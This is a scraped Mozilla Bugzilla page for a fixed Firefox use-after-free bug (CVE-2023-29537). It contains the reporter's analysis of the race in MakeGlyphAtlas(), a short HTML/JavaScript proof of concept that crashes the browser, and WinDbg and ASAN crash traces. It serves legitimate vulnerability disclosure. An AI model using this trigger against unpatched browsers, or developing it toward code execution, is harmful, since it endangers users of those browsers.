| [Updated](/show_bug.cgi?id=1824200#a37498556_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1824200&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from bugzilla.mozilla.org_5102d194_20250115_090633.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1823365)
* [XML](/show_bug.cgi?ctype=xml&id=1823365)

Closed
[Bug 1823365](/show_bug.cgi?id=1823365)
(CVE-2023-29537)

Opened 2 years ago
Closed 2 years ago

# initialization race leading to use after free in MakeGlyphAtlas()

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

initialization race leading to use after free in MakeGlyphAtlas()

## Categories

### (Core :: Graphics: Text, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Graphics%3A%20Text#Graphics%3A%20Text)

Graphics: Text
▾

Core :: Graphics: Text

Issues with glyph rasterization and painting, font format support, and interfacing with platform font APIs. For issues with font selection, text shaping, and glyph selection, see the Layout: Text and Fonts component.

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20Text&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20Text&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Graphics%3A%20Text)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Firefox 113

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S3

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

113 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Priority | --- |
| --- | --- |
| Accessibility Severity | --- |
| Performance Impact | --- |
| a11y-review | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr102 | --- | [unaffected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=unaffected) |
| firefox111 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix) |
| firefox112 | [+](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=verified) |
| firefox113 | [+](/buglist.cgi?f1=cf_tracking_firefox113&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr102 |  | unaffected |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox111 |  | wontfix |
| firefox112 | + | verified |
| firefox113 | + | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: loobenyang, Assigned: jfkthame)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=40)  [jfkthame](/user_profile?user_id=329583)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=40)  [loobenyang](/user_profile?user_id=506912)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/029a38b9773f1943419c24b7c3d93761?d=mm&size=40)  [lsalzman](/user_profile?user_id=536714)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

14 people

## References

### (Regressed 1 open bug)

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace")

Dependency [tree](/showdependencytree.cgi?id=1823365&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1823365)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

[1874324](/show_bug.cgi?id=1874324 "NEW - LeakSanitizer: detected memory leaks [@ MakeGlyphAtlas]")

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (4 keywords, Whiteboard: [adv-main112+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2023-29537

[Keywords:](/describekeywords.cgi)

[csectype-race](/buglist.cgi?keywords=csectype-race&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main112+]

QA Whiteboard:

[qa-triaged]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a1325490_1689 "2 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (6 files)

| [UAF\_MakeGlyphAtlas\_PoC.html](/attachment.cgi?id=9323897)  [2 years ago](#c0)  [Looben Yang](/user_profile?user_id=506912)   578 bytes, text/html |  | [Details](/attachment.cgi?id=9323897&action=edit) |
| --- | --- | --- |
| [tsan.txt](/attachment.cgi?id=9324553)  [2 years ago](#c6)  [Tyson Smith [:tsmith]](/user_profile?user_id=486634)   55.41 KB, text/plain |  | [Details](/attachment.cgi?id=9324553&action=edit) |
| [Bug 1823365 - Clean up management of missing-glyph atlas.](/attachment.cgi?id=9324559)  [2 years ago](#c8)  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)   48 bytes, text/x-phabricator-request | tjr : [sec-approval+](#c19 "2 years ago") | [Details](/attachment.cgi?id=9324559&action=edit) | [Review](/attachment.cgi?id=9324559) |
| [tsan\_with\_patch.txt](/attachment.cgi?id=9324576)  [2 years ago](#c11)  [Tyson Smith [:tsmith]](/user_profile?user_id=486634)   69.12 KB, text/plain |  | [Details](/attachment.cgi?id=9324576&action=edit) |
| [Bug 1823365 - Clean up management of missing-glyph atlas.](/attachment.cgi?id=9324996)  [2 years ago](#c20)  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)   48 bytes, text/x-phabricator-request | diannaS : [approval-mozilla-beta+](#c24 "2 years ago") | [Details](/attachment.cgi?id=9324996&action=edit) | [Review](/attachment.cgi?id=9324996) |
| [advisory.txt](/attachment.cgi?id=9327572)  [2 years ago](#c29)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   185 bytes, text/plain |  | [Details](/attachment.cgi?id=9327572&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | Multiple Authors |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1823365#c0)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1823365&comment_id=16333653 "1 revision") |
|  | |

Attached file
[UAF\_MakeGlyphAtlas\_PoC.html](attachment.cgi?id=9323897)
— [Details](attachment.cgi?id=9323897&action=edit)

VULNERABILITY DETAILS

Specifically crafted HTML file can trigger Use After Free in GFX code `MakeGlyphAtlas()`. This bug can potentially be exploited to achieve one click Remote Code Execution in content process.

`gGlyphMask` is static variable in `gfxFontMissingGlyphs.cpp`, so it's intended to be initialized/constructed once only.

```
	static RefPtr<SourceSurface> gGlyphMask;

```

However, the code inside function MakeGlyphAtlas() in file gfxFontMissingGlyphs.cpp is subject to race condition.

```
		static bool MakeGlyphAtlas(const DeviceColor& aColor) {
		...
		  if (!gGlyphMask) {
			gGlyphMask = gGlyphDrawTarget->CreateSourceSurfaceFromData(
		...
		}

```

When JS script like `ctx0.fillText("&#9175;&#9856;ïž&cent;")` from the PoC is called from web worker. `MakeGlyphAtlas()` is executed in worker thread.

If two threads check `gGlyphMask` and `gGlyphMask` is null in both cases, then they both satisfy the if clause of `if (!gGlyphMask)`, and try to call `CreateSourceSurfaceFromData()` to create a new `SourceSurfaceSkia` object and assign it as `RefPtr` to `gGlyphMask`. One thread executes `CreateSourceSurfaceFromData()` sooner and creates an `SourceSurfaceSkia` object first. Then when the second thread executes `CreateSourceSurfaceFromData()` and try to assign the newly created second `SourceSurfaceSkia` object to `gGlyphMask`, `gGlyphMask` is not null (different from when it's being null check), so the assignment ("=") operation would release the firstly created `SourceSurfaceSkia` object.

After that, when the first thread continues to execute the subsequent code, the operations against `gGlyphMask` are Use After Free:

```
gGlyphDrawTarget->MaskSurface(ColorPattern(aColor), gGlyphMask, Point(0, 0),
							DrawOptions(1.0f, CompositionOp::OP_SOURCE));

```

VERSION

Firefox 113.0a1 (2023-03-19) (64-bit)

OS Windows 11 Home 22H2 (Build 22621.1413)

REPRODUCTION CASE (UAF\_MakeGlyphAtlas\_PoC.html)

```
<script>
	workers = [];
	workerCode = 'offscreenCanvas0 = new OffscreenCanvas(100, 100); \n'
	workerCode += 'ctx0 = offscreenCanvas0.getContext("2d"); \n'
	workerCode += 'setTimeout(function(){ctx0.fillText("&#9175;&#9856;ïž&cent;",  47,15);}, 2);\n'
	workerCode += 'setTimeout(function(){ctx0.fillText("&#9175;&#9856;ïž&cent;",  47,15);}, 1);\n'

	for(var i = 0; i < 10; i++)
	{
		var blob = new Blob([workerCode],{type: "text/javascript"});
		workers[i] = new Worker(window.URL.createObjectURL(blob));
	}

	setTimeout(function(){location.reload();},300);
	</script>

```

Type of crash: content process

Crash State:

```
(4048.ee0): Access violation - code c0000005 (!!! second chance !!!)
xul!mozilla::gfx::GetSkImageForSurface+0x36:
00007ff9`d1774436 488b4008        mov     rax,qword ptr [rax+8] ds:e5e5e5e5`e5e5e5ed=????????????????
9:318> r
rax=e5e5e5e5e5e5e5e5 rbx=000000ffebb7ac10 rcx=000000ffebb7abf8
rdx=000002d63522d800 rsi=000000ffebb7abf8 rdi=000002d63522d800
rip=00007ff9d1774436 rsp=000000ffebb7aa50 rbp=0000000000000000
 r8=000000ffebb7ac10  r9=0000000000000000 r10=00000fff3a159cf2
r11=0014000000000400 r12=000002d63522d800 r13=000002d6352a7700
r14=000000ffebb7ac20 r15=000000ffebb7adc0
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010204
xul!mozilla::gfx::GetSkImageForSurface+0x36:
00007ff9`d1774436 488b4008        mov     rax,qword ptr [rax+8] ds:e5e5e5e5`e5e5e5ed=????????????????
9:318> dv
	   aSurface = 0x000002d6`3522d800
		  aLock = 0x000000ff`ebb7ac10 Nothing
		aBounds = <value unavailable>
		aMatrix = <value unavailable>
			map = struct mozilla::gfx::DataSourceSurface::MappedSurface
		 pixmap = class SkPixmap
		  image = class sk_sp<SkImage>
	dataSurface = <value unavailable>
	releaseProc = <value unavailable>
		   surf = <value unavailable>
9:318> k
 # Child-SP          RetAddr           Call Site
00 000000ff`ebb7aa50 00007ff9`d177638c xul!mozilla::gfx::GetSkImageForSurface+0x36 [/builds/worker/checkouts/gecko/gfx/2d/DrawTargetSkia.cpp @ 246]
01 (Inline Function) --------`-------- xul!mozilla::gfx::ExtractAlphaForSurface+0xb [/builds/worker/checkouts/gecko/gfx/2d/DrawTargetSkia.cpp @ 460]
02 000000ff`ebb7abd0 00007ff9`d18d527e xul!mozilla::gfx::DrawTargetSkia::MaskSurface+0x12c [/builds/worker/checkouts/gecko/gfx/2d/DrawTargetSkia.cpp @ 1441]
03 (Inline Function) --------`-------- xul!MakeGlyphAtlas+0x1b1 [/builds/worker/checkouts/gecko/gfx/thebes/gfxFontMissingGlyphs.cpp @ 112]
04 (Inline Function) --------`-------- xul!GetGlyphAtlas+0x222 [/builds/worker/checkouts/gecko/gfx/thebes/gfxFontMissingGlyphs.cpp @ 131]
05 000000ff`ebb7ad70 00007ff9`d18c062a xul!gfxFontMissingGlyphs::DrawMissingGlyph+0x4fe [/builds/worker/checkouts/gecko/gfx/thebes/gfxFontMissingGlyphs.cpp @ 418]
06 000000ff`ebb7aef0 00007ff9`d0b29ef9 xul!gfxFont::DrawMissingGlyph+0x3ba [/builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp @ 2202]
07 (Inline Function) --------`-------- xul!gfxFont::DrawGlyphs+0x1be5 [/builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp @ 2030]
08 000000ff`ebb7b050 00007ff9`d0a177b9 xul!gfxFont::Draw+0x2179 [/builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp @ 2530]
09 (Inline Function) --------`-------- xul!gfxTextRun::DrawGlyphs+0x5c [/builds/worker/checkouts/gecko/gfx/thebes/gfxTextRun.cpp @ 429]
0a 000000ff`ebb7bb10 00007ff9`d22906e6 xul!gfxTextRun::Draw+0x4b9 [/builds/worker/checkouts/gecko/gfx/thebes/gfxTextRun.cpp @ 683]
0b 000000ff`ebb7cbf0 00007ff9`d2f4defc xul!mozilla::dom::CanvasBidiProcessor::DrawText+0x576 [/builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp @ 4124]
0c 000000ff`ebb7ce70 00007ff9`d2f4d8fd xul!nsBidiPresUtils::ProcessSimpleRun+0x11c [/builds/worker/checkouts/gecko/layout/base/nsBidiPresUtils.cpp @ 2390]
0d 000000ff`ebb7cf80 00007ff9`d224b3cf xul!nsBidiPresUtils::ProcessText+0x1dd [/builds/worker/checkouts/gecko/layout/base/nsBidiPresUtils.cpp @ 2165]
0e 000000ff`ebb7d140 00007ff9`d224a72a xul!mozilla::dom::CanvasRenderingContext2D::DrawOrMeasureText+0xc9f [/builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp @ 4448]
0f 000000ff`ebb7d400 00007ff9`d1c9c15a xul!mozilla::dom::CanvasRenderingContext2D::FillText+0x2a [/builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp @ 3863]
10 000000ff`ebb7d440 00007ff9`d0831055 xul!mozilla::dom::OffscreenCanvasRenderingContext2D_Binding::fillText+0x2ea [/builds/worker/workspace/obj-build/dom/bindings/OffscreenCanvasRenderingContext2DBinding.cpp @ 3904]
11 000000ff`ebb7d5a0 00007ff9`d0eb9e19 xul!mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy,mozilla::dom::binding_detail::ThrowExceptions>+0x145 [/builds/worker/checkouts/gecko/dom/bindings/BindingUtils.cpp @ 3318]
12 (Inline Function) --------`-------- xul!CallJSNative+0x181 [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 459]
13 (Inline Function) --------`-------- xul!js::InternalCallOrConstruct+0x569 [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 553]
14 (Inline Function) --------`-------- xul!InternalCall+0x569 [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 620]
15 (Inline Function) --------`-------- xul!js::CallFromStack+0x569 [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 625]
16 000000ff`ebb7d660 00007ff9`d08a0a55 xul!Interpret+0xd479 [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 3368]
17 (Inline Function) --------`-------- xul!js::RunScript+0x5c2 [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 431]
18 (Inline Function) --------`-------- xul!js::InternalCallOrConstruct+0x6ea [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 585]
19 (Inline Function) --------`-------- xul!InternalCall+0x6ea [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 620]
1a 000000ff`ebb7db20 00007ff9`d094ab9f xul!js::Call+0x755 [/builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp @ 652]
1b 000000ff`ebb7dc30 00007ff9`cf260440 xul!JS::Call+0x2bf [/builds/worker/checkouts/gecko/js/src/vm/CallAndConstruct.cpp @ 117]
1c 000000ff`ebb7dd60 00007ff9`cfba8d05 xul!mozilla::dom::Function::Call+0x1a0 [/builds/worker/workspace/obj-build/dom/bindings/FunctionBinding.cpp @ 50]
1d (Inline Function) --------`-------- xul!mozilla::dom::Function::Call+0x144 [/builds/worker/workspace/obj-build/dist/include/mozilla/dom/FunctionBinding.h @ 71]
1e 000000ff`ebb7dec0 00007ff9`d2b86376 xul!mozilla::dom::CallbackTimeoutHandler::Call+0x1c5 [/builds/worker/checkouts/gecko/dom/base/TimeoutHandler.cpp @ 167]
1f 000000ff`ebb7e1a0 00007ff9`cf0da944 xul!mozilla::dom::WorkerPrivate::RunExpiredTimeouts+0x486 [/builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp @ 5163]
20 000000ff`ebb7e330 00007ff9`cf782505 xul!mozilla::dom::WorkerRunnable::Run+0x1a4 [/builds/worker/checkouts/gecko/dom/workers/WorkerRunnable.cpp @ 377]
21 (Inline Function) --------`-------- xul!nsTimerImpl::Fire::<lambda_2>::operator()+0x1d [/builds/worker/checkouts/gecko/xpcom/threads/nsTimerImpl.cpp @ 656]
22 (Inline Function) --------`-------- xul!mozilla::detail::VariantImplementation<unsigned char,1,nsCOMPtr<nsITimerCallback>,nsCOMPtr<nsIObserver>,nsTimerImpl::FuncCallback,nsTimerImpl::ClosureCallback>::matchN+0x173 [/builds/worker/workspace/obj-build/dist/include/mozilla/Variant.h @ 309]
23 (Inline Function) --------`-------- xul!mozilla::detail::VariantImplementation<unsigned char,0,nsTimerImpl::UnknownCallback,nsCOMPtr<nsITimerCallback>,nsCOMPtr<nsIObserver>,nsTimerImpl::FuncCallback,nsTimerImpl::ClosureCallback>::matchN+0x184 [/builds/worker/workspace/obj-build/dist/include/mozilla/Variant.h @ 318]
24 (Inline Function) --------`-------- xul!mozilla::Variant<nsTimerImpl::UnknownCallback,nsCOMPtr<nsITimerCallback>,nsCOMPtr<nsIObserver>,nsTimerImpl::FuncCallback,nsTimerImpl::ClosureCallback>::matchN+0x184 [/builds/worker/workspace/obj-build/dist/include/mozilla/Variant.h @ 902]
25 (Inline Function) --------`-------- xul!mozilla::Variant<nsTimerImpl::UnknownCallback,nsCOMPtr<nsITimerCallback>,nsCOMPtr<nsIObserver>,nsTimerImpl::FuncCallback,nsTimerImpl::ClosureCallback>::match+0x184 [/builds/worker/workspace/obj-build/dist/include/mozilla/Variant.h @ 857]
26 000000ff`ebb7e4d0 00007ff9`cf773b73 xul!nsTimerImpl::Fire+0x3a5 [/builds/worker/checkouts/gecko/xpcom/threads/nsTimerImpl.cpp @ 654]
27 000000ff`ebb7e660 00007ff9`d2b8c62a xul!nsTimerEvent::Run+0x63 [/builds/worker/checkouts/gecko/xpcom/threads/TimerThread.cpp @ 469]
28 000000ff`ebb7e840 00007ff9`cf0da944 xul!mozilla::dom::`anonymous namespace'::ExternalRunnableWrapper::WorkerRun+0x2a [/builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp @ 201]
29 000000ff`ebb7e8a0 00007ff9`d07d9dce xul!mozilla::dom::WorkerRunnable::Run+0x1a4 [/builds/worker/checkouts/gecko/dom/workers/WorkerRunnable.cpp @ 377]
2a 000000ff`ebb7ea40 00007ff9`d07eeb9e xul!nsThread::ProcessNextEvent+0x106e [/builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp @ 1234]
2b 000000ff`ebb7ede0 00007ff9`cf0da19c xul!NS_ProcessNextEvent+0x3e [/builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp @ 477]
2c 000000ff`ebb7ee30 00007ff9`cfeabbe2 xul!mozilla::dom::WorkerPrivate::DoRunLoop+0x1cc [/builds/worker/checkouts/gecko/dom/workers/WorkerPrivate.cpp @ 3281]
2d 000000ff`ebb7ef30 00007ff9`d07d9dce xul!mozilla::dom::workerinternals::`anonymous namespace'::WorkerThreadPrimaryRunnable::Run+0x2a2 [/builds/worker/checkouts/gecko/dom/workers/RuntimeService.cpp @ 2049]
2e 000000ff`ebb7f0c0 00007ff9`d07d8985 xul!nsThread::ProcessNextEvent+0x106e [/builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp @ 1234]
2f (Inline Function) --------`-------- xul!NS_ProcessNextEvent+0x29 [/builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp @ 477]
30 000000ff`ebb7f460 00007ff9`cf93340f xul!mozilla::ipc::MessagePumpForNonMainThreads::Run+0xf5 [/builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp @ 300]
31 (Inline Function) --------`-------- xul!MessageLoop::RunInternal+0x16 [/builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc @ 381]
32 000000ff`ebb7f510 00007ff9`cef5fc7e xul!MessageLoop::RunHandler+0x2f [/builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc @ 375]
33 000000ff`ebb7f560 00007ff9`cf775f03 xul!MessageLoop::Run+0x4e [/builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc @ 357]
34 000000ff`ebb7f5c0 00007ffa`0ebc577c xul!nsThread::ThreadFunc+0xe3 [/builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp @ 393]
35 000000ff`ebb7f780 00007ffa`0ec4a411 nss3!_PR_NativeRunThread+0x13c [/builds/worker/checkouts/gecko/nsprpub/pr/src/threads/combined/pruthr.c @ 421]
36 000000ff`ebb7f800 00007ffa`5c849363 nss3!pr_root+0x11 [/builds/worker/checkouts/gecko/nsprpub/pr/src/md/windows/w95thred.c @ 140]
37 000000ff`ebb7f830 00007ffa`5dc626bd ucrtbase!thread_start<unsigned int (__cdecl*)(void *),1>+0x93
38 000000ff`ebb7f860 00007ffa`1f6251c8 KERNEL32!BaseThreadInitThunk+0x1d
39 (Inline Function) --------`-------- mozglue!mozilla::interceptor::FuncHook<mozilla::interceptor::WindowsDllInterceptor<mozilla::interceptor::VMSharingPolicyShared>,void (*)(int, void *, void *)>::operator()+0x15 [/builds/worker/checkouts/gecko/toolkit/xre/dllservices/mozglue/nsWindowsDllInterceptor.h @ 150]
3a 000000ff`ebb7f890 00007ffa`5ecca9f8 mozglue!patched_BaseThreadInitThunk+0x28 [/builds/worker/checkouts/gecko/toolkit/xre/dllservices/mozglue/WindowsDllBlocklist.cpp @ 592]
3b 000000ff`ebb7f900 00000000`00000000 ntdll!RtlUserThreadStart+0x28
9:318> dx -id 0,9 -r1 ((xul!mozilla::gfx::SourceSurface *)0x2d63522d800)
((xul!mozilla::gfx::SourceSurface *)0x2d63522d800)                 : 0x2d63522d800 [Type: mozilla::gfx::SourceSurface *]
	[+0x008] mWeakRef         [Type: RefPtr<mozilla::detail::ThreadSafeWeakReference>]
	[+0x010] mUserData        [Type: mozilla::gfx::ThreadSafeUserData]
9:318> dx -id 0,9 -r1 (*((xul!RefPtr<mozilla::detail::ThreadSafeWeakReference> *)0x2d63522d808))
(*((xul!RefPtr<mozilla::detail::ThreadSafeWeakReference> *)0x2d63522d808))                 [Type: RefPtr<mozilla::detail::ThreadSafeWeakReference>]
	[+0x000] mRawPtr          : 0xe5e5e5e5e5e5e5e5 [Type: mozilla::detail::ThreadSafeWeakReference *]
9:318> dx -id 0,9 -r1 ((xul!mozilla::detail::ThreadSafeWeakReference *)0xe5e5e5e5e5e5e5e5)
((xul!mozilla::detail::ThreadSafeWeakReference *)0xe5e5e5e5e5e5e5e5)                 : 0xe5e5e5e5e5e5e5e5 [Type: mozilla::detail::ThreadSafeWeakReference *]
	[+0x000] mRefCnt          [Type: mozilla::detail::RC<unsigned long long,0>]
	[+0x008] mStrongCnt       [Type: mozilla::detail::RC<unsigned long long,0>]
	[+0x010] mPtr             : Unable to read memory at Address 0xe5e5e5e5e5e5e5f5

```

CREDIT INFORMATION

Reporter credit: Looben Yang

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1823365#c1)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1823365&comment_id=16333655 "1 revision") |
|  | |

I also run the PoC on the official Firefox ASAN build. Here is the ASAN report for your easier assessment:

113.0a1 (2023-03-19) (64-bit)

```
=================================================================
==18340==ERROR: AddressSanitizer: heap-use-after-free on address 0x12709a7ebec0 at pc 0x7ff9b892b6ca bp 0x00ff60bf4d20 sp 0x00ff60bf4d68
READ of size 8 at 0x12709a7ebec0 thread T26
    #0 0x7ff9b892b6c9 in mozilla::gfx::GetSkImageForSurface /builds/worker/checkouts/gecko/gfx/2d/DrawTargetSkia.cpp:246
    #1 0x7ff9b89373fb in mozilla::gfx::DrawTargetSkia::MaskSurface /builds/worker/checkouts/gecko/gfx/2d/DrawTargetSkia.cpp:1441
    #2 0x7ff9b923c31e in gfxFontMissingGlyphs::DrawMissingGlyph /builds/worker/checkouts/gecko/gfx/thebes/gfxFontMissingGlyphs.cpp:418
    #3 0x7ff9b91ce249 in gfxFont::DrawMissingGlyph /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2202
    #4 0x7ff9b91d8338 in gfxFont::DrawGlyphs<0,0> /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2030
    #5 0x7ff9b91d1e8d in gfxFont::Draw /builds/worker/checkouts/gecko/gfx/thebes/gfxFont.cpp:2530
    #6 0x7ff9b9293f6a in gfxTextRun::Draw /builds/worker/checkouts/gecko/gfx/thebes/gfxTextRun.cpp:683
    #7 0x7ff9bc86e121 in mozilla::dom::CanvasBidiProcessor::DrawText /builds/worker/checkouts/gecko/dom/canvas/CanvasRenderingContext2D.cpp:4123
    #8 0x7ff9c11c9b54 in nsBidiPresUtils::ProcessSimpleRun /builds/worker/checkouts/gecko/layout/base/nsBidiPresUtils.cpp:2387
    #9 0x7ff9c11c90ea in nsBidiPresUtils::ProcessText /builds/worker/checkouts/gecko/layout/base/nsBidiPresUtils.cpp:2165
